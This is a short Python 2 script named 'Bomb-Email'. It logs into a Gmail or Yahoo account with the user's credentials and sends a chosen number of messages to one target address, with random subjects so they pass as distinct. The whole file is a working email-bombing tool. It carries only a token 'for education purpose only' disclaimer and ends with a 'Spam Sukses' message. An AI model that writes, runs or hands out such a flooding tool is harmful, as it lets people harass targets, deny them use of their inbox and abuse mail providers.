#!/usr/bin/python
#Bomb-Email
#This code for education purpose only.
#Use it at your own risk !!!


import os
import smtplib
import getpass
import sys


server = raw_input ('Choose Gmail or Yahoo: ')
user = raw_input('Your Email: ')
passwd = getpass.getpass('Your Password: ')


to = raw_input('\nEnter Email Target: ')
#subject = raw_input('Subject: ') 
body = raw_input('Spam Messages: ')
total = input('Amount: ')

if server == 'gmail':
    smtp_server = 'smtp.gmail.com'
    port = 587
elif server == 'yahoo':
    smtp_server = 'smtp.mail.yahoo.com'
    port = 25
else:
    print 'Applies only to gmail and yahoo.'
    sys.exit()

print ''

try:
    server = smtplib.SMTP(smtp_server,port) 
    server.ehlo()
    if smtp_server == "smtp.gmail.com":
            server.starttls()
    server.login(user,passwd)
    for i in range(1, total+1):
        subject = os.urandom(9)
        msg = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
        server.sendmail(user,to,msg)
        print "\rE-mails sent: %i" % i
        sys.stdout.flush()
    server.quit()
    print '\n Priv8-L1ng Spam Sukses!!!'
except KeyboardInterrupt:
    print '[-] Canceled'
    sys.exit()
except smtplib.SMTPAuthenticationError:
    print '\n[!] your username and email password is incorrect'
    sys.exit()
